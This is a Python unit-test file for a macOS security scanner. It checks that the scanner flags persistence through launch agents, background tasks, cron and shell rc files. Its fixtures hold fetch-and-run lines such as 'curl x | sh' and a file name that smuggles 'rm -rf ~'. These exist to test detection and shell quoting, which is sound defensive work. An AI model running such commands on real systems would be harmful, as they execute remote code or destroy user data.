import plistlib
import shlex
import unittest

from msec.checks import persistence
from tests.helpers import tmp_ctx

BTM = """
========================
 Records for UID -2 : FFFF
========================
 Items:
 #1:
                 Name: SystemThing
                 Type: app (0x2)
          Disposition: [enabled, allowed, notified] (0xb)
========================
 Records for UID 501 : 8E05
========================

 Items:

 #1:
                 UUID: 1
                 Name: Good App
       Developer Name: Good Corp
      Team Identifier: ABCDE12345
                 Type: app (0x2)
          Disposition: [enabled, allowed, notified] (0xb)
           Identifier: com.good.app
                  URL: file:///Applications/Good.app/

 #2:
                 UUID: 2
                 Name: sneaky
       Developer Name: (null)
                 Type: background tasks (0x2000)
          Disposition: [enabled, allowed, notified] (0xb)
           Identifier: sneaky.helper
      Executable Path: /Users/u/.local/sneaky

 #3:
                 Name: off
       Developer Name: (null)
                 Type: app (0x2)
          Disposition: [disabled, allowed, not notified] (0x2)
           Identifier: off.app

 #4:
                 Name: legacy
       Developer Name: (null)
                 Type: legacy agent (0x10008)
          Disposition: [enabled, allowed, notified] (0xb)
           Identifier: legacy.agent
"""
SIGNED = (0, "", "Executable=/opt/x\nAuthority=Developer ID Application: Good (ABCDE12345)\nTeamIdentifier=ABCDE12345\n")
UNSIGNED = (1, "", "/Users/u/evil: code object is not signed at all\n")


def write_plist(ctx, name, program_args):
    d = ctx.home / "Library/LaunchAgents"
    d.mkdir(parents=True, exist_ok=True)
    p = d / name
    p.write_bytes(plistlib.dumps({"Label": name.removesuffix(".plist"), "ProgramArguments": program_args}))
    return p


def by_check(results, name):
    return next(r for r in results if r.check == name)


class PersistenceTest(unittest.TestCase):
    def test_script_launch_agent_is_critical(self):
        ctx = tmp_ctx({"/usr/bin/codesign": SIGNED, "/usr/bin/sfltool": (0, "", ""), "/usr/bin/crontab": (1, "", "crontab: no crontab for u\n")})
        write_plist(ctx, "com.evil.plist", ["/bin/sh", "-c", "curl -s x | sh"])
        r = by_check(persistence.run(ctx), "persistence.launchd")
        f = r.findings[0]
        self.assertEqual(f.severity, "critical")
        self.assertIn("(script)", f.title)

    def test_signed_agent_is_medium_unsigned_is_critical(self):
        evil = "/Users/u/evil"
        ctx = tmp_ctx({("/usr/bin/codesign", "-dv", "--verbose=2", "/opt/x"): SIGNED,
                       ("/usr/bin/codesign", "-dv", "--verbose=2", evil): UNSIGNED})
        write_plist(ctx, "a.plist", ["/opt/x"])
        write_plist(ctx, "b.plist", [evil])
        sev = {f.key["program"]: f.severity for f in by_check(persistence.run(ctx), "persistence.launchd").findings}
        self.assertEqual(sev, {"/opt/x": "medium", evil: "critical"})

    def test_payload_change_changes_fingerprint(self):
        ctx = tmp_ctx({"/usr/bin/codesign": SIGNED})
        write_plist(ctx, "a.plist", ["/opt/x", "--one"])
        fp1 = by_check(persistence.run(ctx), "persistence.launchd").findings[0].fingerprint
        write_plist(ctx, "a.plist", ["/opt/x", "--two"])
        fp2 = by_check(persistence.run(ctx), "persistence.launchd").findings[0].fingerprint
        self.assertNotEqual(fp1, fp2)

    def test_fix_command_quotes_hostile_file_names(self):
        ctx = tmp_ctx({"/usr/bin/codesign": SIGNED})
        p = write_plist(ctx, "x'; rm -rf ~; '.plist", ["/opt/x"])
        fix = by_check(persistence.run(ctx), "persistence.launchd").findings[0].fix[0]
        self.assertEqual(shlex.split(fix)[-1], str(p))

    def test_unparseable_plist_is_reported_not_crashing(self):
        ctx = tmp_ctx({"/usr/bin/codesign": SIGNED})
        d = ctx.home / "Library/LaunchAgents"
        d.mkdir(parents=True)
        (d / "broken.plist").write_text("not a plist")
        f = by_check(persistence.run(ctx), "persistence.launchd").findings[0]
        self.assertEqual((f.severity, f.key.get("unparseable")), ("medium", True))

    def test_parse_btm_only_own_uid(self):
        recs = persistence.parse_btm(BTM, 501)
        self.assertEqual([r.get("Identifier") for r in recs], ["com.good.app", "sneaky.helper", "off.app", "legacy.agent"])

    def test_btm_flags_enabled_unsigned_and_skips_disabled_and_legacy(self):
        ctx = tmp_ctx({"/usr/bin/sfltool": (0, BTM, "")})
        r = by_check(persistence.run(ctx), "persistence.btm")
        sev = {f.key["identifier"]: f.severity for f in r.findings}
        self.assertEqual(sev, {"com.good.app": "medium", "sneaky.helper": "critical"})

    def test_btm_failure_is_not_scanned(self):
        ctx = tmp_ctx({"/usr/bin/sfltool": "timeout"})
        self.assertEqual(by_check(persistence.run(ctx), "persistence.btm").status, "not_scanned")

    def test_crontab(self):
        ctx = tmp_ctx({"/usr/bin/crontab": (1, "", "crontab: no crontab for u\n")})
        self.assertEqual(by_check(persistence.run(ctx), "persistence.cron").status, "ok")
        ctx = tmp_ctx({"/usr/bin/crontab": (0, "# comment\n\n*/5 * * * * curl x|sh\n", "")})
        fs = by_check(persistence.run(ctx), "persistence.cron").findings
        self.assertEqual([f.severity for f in fs], ["critical"])

    def test_rc_change_changes_fingerprint(self):
        ctx = tmp_ctx()
        (ctx.home / ".zshrc").write_text("export A=1\n")
        fp1 = by_check(persistence.run(ctx), "persistence.rc").findings[0].fingerprint
        (ctx.home / ".zshrc").write_text("export A=1\ncurl x | sh\n")
        fp2 = by_check(persistence.run(ctx), "persistence.rc").findings[0].fingerprint
        self.assertNotEqual(fp1, fp2)

    def test_malformed_plist_shapes_are_unparseable(self):
        ctx = tmp_ctx({"/usr/bin/codesign": SIGNED})
        d = ctx.home / "Library/LaunchAgents"
        d.mkdir(parents=True)
        (d / "arr.plist").write_bytes(plistlib.dumps(["a", "b"]))
        (d / "int.plist").write_bytes(plistlib.dumps({"Label": "x", "ProgramArguments": 5}))
        write_plist(ctx, "ok.plist", ["/opt/x"])
        fs = by_check(persistence.run(ctx), "persistence.launchd").findings
        self.assertEqual(sorted(f.severity for f in fs), ["medium"] * 3)
        self.assertEqual(sum(1 for f in fs if f.key.get("unparseable")), 2)

    def test_denied_dir_is_partial_not_clean(self):
        ctx = tmp_ctx({"/usr/bin/codesign": SIGNED})
        d = ctx.home / "Library/LaunchAgents"
        d.mkdir(parents=True)
        d.chmod(0)
        self.addCleanup(d.chmod, 0o700)
        names = [r.check for r in persistence.run(ctx) if r.status == "not_scanned"]
        self.assertIn("persistence.launchd.partial", names)

    def test_interpreter_by_basename_and_dash_c(self):
        for prog in ("/opt/homebrew/bin/bash", "/usr/local/bin/python3.12", "/bin/ksh"):
            ctx = tmp_ctx({"/usr/bin/codesign": SIGNED})
            write_plist(ctx, "a.plist", [prog])
            f = by_check(persistence.run(ctx), "persistence.launchd").findings[0]
            self.assertEqual(f.severity, "critical", prog)
            self.assertIn("(script)", f.title)
        ctx = tmp_ctx({"/usr/bin/codesign": SIGNED})
        write_plist(ctx, "a.plist", ["/opt/x", "-c", "boom"])
        self.assertEqual(by_check(persistence.run(ctx), "persistence.launchd").findings[0].severity, "critical")
        ctx = tmp_ctx({"/usr/bin/codesign": SIGNED})
        write_plist(ctx, "a.plist", ["/opt/x", "--flag"])
        self.assertEqual(by_check(persistence.run(ctx), "persistence.launchd").findings[0].severity, "medium")

    def test_btm_without_our_section_is_not_scanned(self):
        ctx = tmp_ctx({"/usr/bin/sfltool": (0, "", "")})
        self.assertEqual(by_check(persistence.run(ctx), "persistence.btm").status, "not_scanned")


if __name__ == "__main__":
    unittest.main()
